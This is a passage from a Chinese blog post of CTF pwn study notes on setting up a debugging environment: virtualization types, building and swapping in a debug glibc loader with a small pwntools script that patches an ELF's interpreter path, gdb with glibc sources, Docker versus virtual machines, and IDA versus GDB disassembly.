<li>半虚拟化，修改开源操作系统，在其中加入与虚拟机管理程序协同的代码，但不需要进行拦截和模拟，性能更高，如 Hyper-V。</li>
<li>全虚拟化，不需要对操作系统进行改动，提供了完整的包括处理器、内存和外设的虚拟化平台，对虚拟机中运行的高权限指令进行拦截和模拟，保证相关操作隔离在当前虚拟机中。如 VMware、VirtualBox、QEMU。</li>
</ul>
<p>&emsp;编译 debug 版本的 glibc，并在编译源代码中使用：</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240508150349382.png" alt="image-20240508150349382" style="zoom:67%;" /></p>
<p>&emsp;使用某版本 libc 运行其它已编译的程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">方法 1：/usr/local/glibc-2.26/lib/ld-2.26.so ./hello</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">方法 2：替换 ELF 文件中的解释器路径（PT_INTERP），解释器指定了 ELF 可执行文件在运行时应当使用的动态链接器的路径，动态链接器负责在程序启动前加载动态库，解析动态符号，并进行重定位。可以使用如下脚本来更改：</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># change_ld.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_ld</span>(<span class="params">binary, ld, output</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> binary <span class="keyword">or</span> <span class="keyword">not</span> ld <span class="keyword">or</span> <span class="keyword">not</span> output:</span><br><span class="line">        log.failure(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    binary = ELF(binary)</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> s.header[<span class="string">&#x27;p_type&#x27;</span>] == <span class="string">&quot;PT_INTERP&quot;</span>:</span><br><span class="line">            size = s.header[<span class="string">&#x27;p_memsz&#x27;</span>]</span><br><span class="line">            addr = s.header[<span class="string">&#x27;p_paddr&#x27;</span>]</span><br><span class="line">            data = s.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= <span class="built_in">len</span>(ld):</span><br><span class="line">                log.failure(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            binary.write(addr, <span class="string">&quot;/lib64/ld-glibc-&#123;&#125;&quot;</span>.<span class="built_in">format</span>(ld).ljust(size, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> os.access(output, os.F_OK):</span><br><span class="line">                os.remove(output)</span><br><span class="line">            binary.save(output)</span><br><span class="line">            os.chmod(output, <span class="number">0b111000000</span>) <span class="comment"># rwx</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;Force to use assigned new ld.so by changing binary&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-b&quot;</span>, dest=<span class="string">&quot;binary&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-l&quot;</span>, dest=<span class="string">&quot;ld&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-o&quot;</span>, dest=<span class="string">&quot;output&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">change_ld(args.binary, args.ld, args.output)</span><br></pre></td></tr></table></figure>
<p>&emsp;运行脚本前需要创建一个 ld 的符号链接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/local/glibc-2.26/lib/ld-2.26.so /lib64/ld-glibc-2.26</span><br></pre></td></tr></table></figure>
<p>&emsp;要调试一个程序，并了解其是如何与 glibc 交互的，可以使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb `find ~/path/to/glibc/source -type d -printf &#x27;-d %p&#x27;` ./a.out</span><br></pre></td></tr></table></figure>
<p>&emsp;Docker 使用使用进程级别的隔离，并使用宿主机的内核，而没有对整个操作系统进行虚拟化，因此和虚拟机相比，它的隔离性较差。其与虚拟机的差别如下所示：</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240508155702375.png" alt="image-20240508155702375" style="zoom:67%;" /></p>
<p>&emsp;Dockerfile 是 image 文件的配置信息，Docker 会根据 Dockerfile 来生成 image 文件。</p>
<p>&emsp;IDA 与 GDB 的反汇编算法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GDB 采用的是线性扫描算法，就是按部就班的反汇编。</span><br><span class="line"></span><br><span class="line">IDA 采用的是递归下降算法，其主要优点是基于控制流，区分代码和数据的能力更强，不会错误地将数据值作为代码。递归下降算法的主要缺点是，它无法处理间接代码路径，如利用指针表查找目标地址的跳转。</span><br></pre></td></tr></table></figure>
<p>&emsp;IDA 常用的插件：</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240508160447929.png" alt="image-20240508160447929" style="zoom:80%;" /></p>
<p>&emsp;一些工具的使用见 P115-P142。</p>

  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/2024/04/01/cve-2024-3094/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/03/29/tracr-paper/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>


	<!-- comment -->
	
<section id="comment">
    <h2 class="title">留言</h2>

    <!-- 
    <div id="disqus_thread" class="ds-thread">
        <script type="text/javascript">
            /**
             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
             */
                /*
                 var disqus_config = function () {
                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                 };
                 */
            (function() { // DON'T EDIT BELOW THIS LINE
                var d = document, s = d.createElement('script');

                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';

                s.setAttribute('data-timestamp', +new Date());
                (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
                Disqus.</a></noscript>
    </div> -->
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
        })
    </script>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-04-01 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/pwn/">pwn<span>4</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#CTF-%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-PWN"><span class="toc-article-text">CTF 竞赛权威指南-PWN</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x00-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-article-text">0x00 二进制文件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#4-%E4%B8%AA%E9%98%B6%E6%AE%B5"><span class="toc-article-text">4 个阶段</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%E9%98%B6%E6%AE%B5"><span class="toc-article-text">预处理阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%BC%96%E8%AF%91%E9%98%B6%E6%AE%B5"><span class="toc-article-text">编译阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%B1%87%E7%BC%96%E9%98%B6%E6%AE%B5"><span class="toc-article-text">汇编阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%93%BE%E6%8E%A5%E9%98%B6%E6%AE%B5"><span class="toc-article-text">链接阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%A4%87%E6%B3%A8"><span class="toc-article-text">备注</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-article-text">ELF 文件格式</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%93%BE%E6%8E%A5%E8%A7%86%E8%A7%92"><span class="toc-article-text">链接视角</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%BF%90%E8%A1%8C%E8%A7%86%E8%A7%92"><span class="toc-article-text">运行视角</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-article-text">静态链接</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-article-text">动态链接</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x01-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="toc-article-text">0x01 汇编基础</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CISC-%E4%B8%8E-RISC"><span class="toc-article-text">CISC 与 RISC</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#x86-x64-%E5%9F%BA%E7%A1%80"><span class="toc-article-text">x86&#x2F;x64 基础</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x02-Linux-%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-article-text">0x02 Linux 安全机制</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-article-text">基础</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Stack-Canaries%EF%BC%88%E4%B8%8D%E5%8F%AF%E6%9B%B4%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%EF%BC%89"><span class="toc-article-text">Stack Canaries（不可更改返回地址）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NJCTF-2017-messager"><span class="toc-article-text">NJCTF 2017: messager</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#sixstars-CTF-2018%EF%BC%9Ababystack"><span class="toc-article-text">sixstars CTF 2018：babystack</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#NX-No-eXecute%EF%BC%88%E5%A0%86%E6%A0%88%E4%B8%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-article-text">NX:No-eXecute（堆栈不可执行）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ASLR-%E4%B8%8E-PIE%EF%BC%88%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E9%9A%8F%E6%9C%BA%E5%8C%96%EF%BC%89"><span class="toc-article-text">ASLR 与 PIE（地址空间随机化）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#FORTIFY-SOURCE%EF%BC%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%94%BB%E5%87%BB%E6%A3%80%E6%9F%A5%EF%BC%89"><span class="toc-article-text">FORTIFY_SOURCE（缓冲区溢出攻击和格式化字符串攻击检查）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#RELRO%EF%BC%88%E8%A7%A3%E5%86%B3%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E7%9A%84-GOT-%E8%A1%A8%E5%8A%AB%E6%8C%81%E9%97%AE%E9%A2%98%EF%BC%89"><span class="toc-article-text">RELRO（解决延迟绑定的 GOT 表劫持问题）</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x03-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-article-text">0x03 环境搭建</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>

	<!-- copyright -->
	<div>
    <ul class="post-copyright">
      <li class="post-copyright-author">
      <strong>作者:  </strong>wd-z711</a>
      </li>
      <li class="post-copyright-link">
      <strong>文章链接:  </strong>
      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
      </li>
      <li class="post-copyright-license">
        <strong>版权声明:   </strong>
        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
        许可协议。转载请注明出处!
      </li>
    </ul>
  <div>
 	

		


</div><!-- row -->




	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2024 wd-z711
  
      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->

     <!-- <script type="text/javascript">
      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
      
      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
    </script> -->
    </p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
